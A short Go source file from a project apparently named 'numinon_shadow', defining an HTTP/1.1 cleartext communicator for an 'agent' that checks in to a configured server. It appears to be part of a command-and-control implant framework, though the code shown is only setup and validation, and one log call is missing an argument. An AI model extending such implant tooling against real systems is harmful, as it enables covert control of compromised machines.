package comm

import (
	"fmt"
	"log"
	"net/http"
	"numinon_shadow/internal/agent/config"
)

type Http1ClearCommunicator struct {
	agentConfig config.AgentConfig
	httpClient  *http.Client
}

func NewHttp1ClearCommunicator(cfg config.AgentConfig) (*Http1ClearCommunicator, error) {
	err := BasicValidate(cfg)
	if err != nil {
		return nil, err
	}

	log.Printf("|COMM INIT|-> Initializing HTTP/1.1 Clear Communicator for %s:%s%s", cfg.ServerIP, cfg.ServerPort, cfg.CheckInEndpoint)

	client := &http.Client{}

	return &Http1ClearCommunicator{
		agentConfig: cfg,
		httpClient:  client,
	}, nil

}

func BasicValidate(cfg config.AgentConfig) error {
	if cfg.Protocol != config.HTTP1Clear {
		return fmt.Errorf("mismatched config: NewHttp1ClearCommunicator called with protocol %s", cfg.Protocol)
	}
	if cfg.ServerIP == "" || cfg.ServerPort == "" || cfg.CheckInEndpoint == "" {
		return fmt.Errorf("config requires ServerIP, ServerPort, and CheckInEndpoint for H1C")
	}
	return nil
}

func (c *Http1ClearCommunicator) Connect() error {
	log.Printf("|COMM %s|-> Connect() called (Mode: %s). Typically no-op for HTTP/1.1.", c.agentConfig.Protocol)
	return nil
}
